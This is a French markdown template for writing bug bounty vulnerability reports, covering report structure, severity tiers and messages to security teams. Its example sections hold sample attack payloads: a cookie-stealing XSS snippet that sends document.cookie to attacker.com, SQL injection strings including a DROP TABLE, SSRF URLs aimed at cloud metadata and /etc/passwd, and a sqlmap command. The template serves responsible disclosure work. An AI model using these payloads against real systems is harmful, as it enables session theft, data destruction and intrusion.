# 🐛 Modèle de rapport de bug bounty

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Bug-Bounty-Report-Template.tr.md) • [🇬🇷 Ελληνικά](Bug-Bounty-Report-Template.el.md)

```
██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗
██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝
██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝ 
██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝  
██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║   
╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝   
██████╗ ███████╗██████╗  ██████╗ ██████╗ ████████╗
██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝
██████╔╝█████╗  ██████╔╝██║   ██║██████╔╝   ██║   
██╔══██╗██╔══╝  ██╔═══╝ ██║   ██║██╔══██╗   ██║   
██║  ██║███████╗██║     ╚██████╔╝██║  ██║   ██║   
╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
```

> **Notes de traduction :** les champs nommés tels que `[Company Name]`, `[Start Date]` ou `[ID]` restent identiques à ceux du modèle source ; leur contenu doit être renseigné. Les clôtures externes utilisent quatre accents graves pour que les exemples imbriqués s’affichent correctement. Le lien de retour vers `Reporting/README.md` est conservé, mais ce fichier manque dans la source fournie.
> **Précisions :** les priorités P1–P4 sont indicatives et dépendent du programme ; les exemples d’impacts exigent des preuves et ne sont pas automatiques. Le vol de cookies XSS ne lit pas les cookies [`HttpOnly`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie#httponly), et l’accès aux métadonnées AWS dépend notamment d’[IMDS et de ses contrôles](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html). Le marqueur `attachment_url` représente une pièce jointe à fournir. Les consignes du programme déterminent les environnements de test autorisés.

---

## 🎯 Modèle rapide

````markdown
## Résumé
[Description de la vulnérabilité en une phrase]

## Gravité
[Critique/Élevé/Modéré/Faible] - CVSS: X.X

## Type de vulnérabilité
[XSS/SQLi/IDOR/SSRF/etc.]

## URL/point de terminaison
`https://example.com/vulnerable-endpoint`

## Étapes de reproduction
1. Étape 1
2. Étape 2
3. Étape 3

## Conséquences
[Ce qu’un attaquant peut accomplir]

## Preuve de concept (PoC)
[Code/Captures d’écran/Vidéo]

## Correction
[Comment corriger le problème]
````

---

## 📝 Modèle de rapport complet

### Format du titre
```
[Severity] [Vulnerability Type] dans [Feature/Endpoint] permet [Impact]

Exemples :
- [Critical] Une injection SQL dans le formulaire de connexion permet d’extraire la base de données
- [High] Une XSS persistante dans les commentaires permet de prendre le contrôle d’un compte
- [Medium] Une IDOR dans /api/users/{id} expose les données personnelles d’autres utilisateurs
```

---

## 📋 Structure détaillée du rapport

````markdown
# [Vulnerability Type] dans [Feature/Endpoint]

## Résumé
Une vulnérabilité de type [vulnerability type] a été découverte dans [feature/endpoint] ; elle
permet à un attaquant de [impact]. Elle touche [scope/users].

## Évaluation de la gravité

| Critère | Valeur |
|--------|-------|
| **Gravité** | Critique / Élevé / Modéré / Faible |
| **Score CVSS** | X.X |
| **Vecteur CVSS** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **CWE** | CWE-XXX: [CWE Name] |

## Détails de la vulnérabilité

### Actif concerné
- **URL:** `https://example.com/path/to/endpoint`
- **Paramètre:** `parameter_name`
- **Méthode:** GET/POST
- **Authentification:** Nécessaire/non nécessaire

### Code/configuration vulnérable
[Si le code est visible et si cela s’applique]

## Étapes de reproduction

### Prérequis
- Compte nécessaire : oui/non
- Accès particulier nécessaire : [décrire]
- Navigateur/outil : [préciser]

### Étapes de reproduction

1. **Accéder au point de terminaison vulnérable**
   ```
   https://example.com/vulnerable-page
   ```

2. **Injecter la charge utile**
   ```
   [Charge utile ici]
   ```

3. **Observer le résultat**
   - [Comportement observé]

### Requête HTTP
```http
POST /api/endpoint HTTP/1.1
Host: example.com
Content-Type: application/json
Cookie: session=abc123

{
  "parameter": "malicious_payload_here"
}
```

### Réponse HTTP
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "result": "vulnerable_response"
}
```

## Preuve de concept (PoC)

### Charge utile utilisée
```
[Votre charge utile ici]
```

### Captures d’écran probantes
![Description](attachment_url)

### Démonstration vidéo du PoC
[Lien vers la démonstration vidéo]

### Script de PoC automatisé (facultatif)
```python
import requests

url = "https://example.com/vulnerable"
payload = {"param": "malicious_input"}
response = requests.post(url, json=payload)
print(response.text)
```

## Évaluation des conséquences

### Conséquences techniques
- **Confidentialité:** [Données accessibles]
- **Intégrité:** [Données modifiables]
- **Disponibilité:** [Interruption de service possible]

### Conséquences sur l’activité
- [Conséquences financières]
- [Atteinte à la réputation]
- [Infractions réglementaires ou manquements à la conformité]
- [Nombre d’utilisateurs concernés]

### Scénario d’attaque
Un attaquant pourrait exploiter cette vulnérabilité pour :
1. [Action précise 1]
2. [Action précise 2]
3. [Action précise 3]

## Recommandations de correction

### Correction immédiate
[Mesure rapide pour réduire le risque]

### Solution durable
[Correction pérenne]

### Exemple de correction du code
```python
# Avant (vulnérable)
query = f"SELECT * FROM users WHERE id = {user_input}"

# Après (corrigé)
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_input,))
```

## Références
- [Lien OWASP]
- [Lien CWE]
- [CVE connexes]
- [Articles de blog/travaux de recherche]

## Calendrier
| Date | Action |
|------|--------|
| YYYY-MM-DD | Vulnérabilité découverte |
| YYYY-MM-DD | Rapport soumis |
| YYYY-MM-DD | Accusé de réception de l’éditeur |
| YYYY-MM-DD | Correctif déployé |
| YYYY-MM-DD | Récompense attribuée |
````

---

## 🔥 Modèles par type de vulnérabilité

### XSS (Cross-Site Scripting)

````markdown
## Résumé
Une vulnérabilité XSS réfléchie/persistante dans [endpoint] permet aux attaquants d’exécuter
du JavaScript arbitraire dans le navigateur des victimes.

## Payload
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
```

## Conséquences
- Détournement de session par vol de cookies
- Prise de contrôle d’un compte
- Enregistrement des frappes au clavier
- Attaques par hameçonnage
- Diffusion de logiciels malveillants

## PoC
```javascript
// Vol de cookies
<script>
fetch('https://attacker.com/steal?c='+document.cookie)
</script>
```
````

### Injection SQL

````markdown
## Résumé
Une injection SQL dans [parameter] au niveau de [endpoint] permet d’extraire le contenu de la base de données.

## Payload
```sql
' OR '1'='1'--
' UNION SELECT username,password FROM users--
1; DROP TABLE users--
```

## Éléments de preuve
- Base de données : MySQL 8.0
- Tables extraites : users, orders, payments
- Enregistrements accessibles : 10,000+

## Commande SQLMap
```bash
sqlmap -u "https://example.com/page?id=1" --dbs --batch
```
````

### IDOR (Insecure Direct Object Reference)

````markdown
## Résumé
Une vulnérabilité IDOR dans [endpoint] permet d’accéder à [resource] appartenant à d’autres utilisateurs.

## Reproduction
1. Se connecter en tant qu’utilisateur A (ID: 100)
2. Accéder à : `GET /api/users/100/profile`
3. Remplacer l’ID par 101 : `GET /api/users/101/profile`
4. Constater que les données de l’utilisateur B sont renvoyées

## Conséquences
- Exposition de données personnelles (nom, courriel, adresse)
- Données de [X] utilisateurs accessibles
- Atteinte au RGPD/à la vie privée

## Éléments de preuve
| Requête | Réponse |
|---------|----------|
| `/api/users/100` | Données de l’utilisateur A ✓ |
| `/api/users/101` | Données de l’utilisateur B ✗ |
| `/api/users/102` | Données de l’utilisateur C ✗ |
````

### SSRF (Server-Side Request Forgery)

````markdown
## Résumé
Une SSRF dans [feature] permet d’envoyer des requêtes à des services internes.

## Payload
```
https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
https://example.com/fetch?url=http://localhost:6379/
https://example.com/fetch?url=file:///etc/passwd
```

## Ressources internes consultées
- Point de terminaison des métadonnées AWS
- Serveur Redis interne
- Système de fichiers local

## Éléments de preuve
```
HTTP/1.1 200 OK

ami-id: ami-12345678
instance-id: i-1234567890abcdef0
```
````

### Contournement de l’authentification

````markdown
## Résumé
Un contournement de l’authentification dans [feature] permet un accès non autorisé à [resource].

## Méthode de contournement
[Décrire la technique de contournement]

## Reproduction
1. Accéder au point de terminaison protégé sans authentification
2. [Technique précise]
3. Constater que l’accès est accordé

## Conséquences
- Accès au panneau d’administration
- Usurpation d’un utilisateur
- Manipulation des données
````

---

## 📊 Guide de classification de la gravité

### Critique (P1)
```
- RCE (exécution de code à distance)
- Injection SQL avec extraction de données
- Contournement de l’authentification donnant un accès administrateur
- Prise de contrôle complète d’un compte
- Manipulation de paiements ou d’opérations financières
- Données personnelles de tous les utilisateurs exposées
```

### Élevé (P2)
```
- XSS persistante avec des conséquences importantes
- IDOR donnant accès à des données sensibles
- SSRF vers des services internes
- Élévation de privilèges
- Exposition de données sensibles
```

### Modéré (P3)
```
- XSS réfléchie
- CSRF sur des actions sensibles
- Divulgation d’informations
- Contournement de la limitation de débit
- Fixation de session
```

### Faible (P4)
```
- Self-XSS (injection dans son propre contexte)
- IDOR sans données sensibles
- Absence d’en-têtes de sécurité
- Messages d’erreur trop détaillés
- Énumération des noms d’utilisateur
```

---

## ✅ Liste de contrôle avant envoi

````markdown
## Avant l’envoi

□ Titre clair et descriptif
□ Évaluation précise de la gravité
□ Reproduction étape par étape
□ Preuve de concept fonctionnelle
□ Conséquences clairement expliquées
□ Captures d’écran/vidéo jointes
□ Correction proposée
□ Actif confirmé dans le périmètre
□ Absence de doublon vérifiée par recherche
□ Grammaire et orthographe vérifiées
□ Données sensibles masquées
□ Coordonnées incluses
````

---

## 💡 Conseils pratiques

### À faire ✅
```
✓ Être clair et concis
✓ Inclure tous les détails nécessaires
✓ Fournir un PoC fonctionnel
✓ Expliquer les conséquences
✓ Proposer une correction
✓ Rester professionnel et respectueux
✓ Respecter une démarche de divulgation responsable
✓ Répondre rapidement aux questions
```

### À éviter ❌
```
✗ Ne pas accéder aux données de véritables utilisateurs
✗ Ne pas effectuer de tests en production
✗ Ne pas dépasser le périmètre
✗ Ne pas utiliser de scanners automatisés sans autorisation
✗ Ne pas divulguer avant la correction
✗ Ne pas se montrer agressif au sujet de la récompense
✗ Ne pas soumettre de doublons
✗ Ne pas soumettre de problèmes purement théoriques
```

---

## 📧 Modèles de communication

### Rapport initial
```
Bonjour [Security Team],

J’ai découvert une vulnérabilité de type [vulnerability type], de gravité [severity], dans
[product/feature]. Vous trouverez tous les détails dans mon rapport.

Résumé: [Une phrase]
Conséquences: [Conséquences en bref]
PoC: [Joint/inclus]

N’hésitez pas à me demander des informations complémentaires.

Cordialement,
[Your name]
[HackerOne/Bugcrowd profile]
```

### Relance
```
Bonjour,

Je reviens vers vous au sujet du rapport #[ID] soumis le [date].
Pourriez-vous m’indiquer où en est son traitement ?

Merci.
```

### Discussion sur la récompense
```
Merci d’avoir évalué mon rapport. Je pense que sa gravité devrait être
[plus élevée/différente], pour les raisons suivantes :

1. [Raison 1]
2. [Raison 2]

Accepteriez-vous de réexaminer le montant de la récompense ?
```

---

**Retour aux modèles :** [📝 Modèles de rapports](../../README.md)
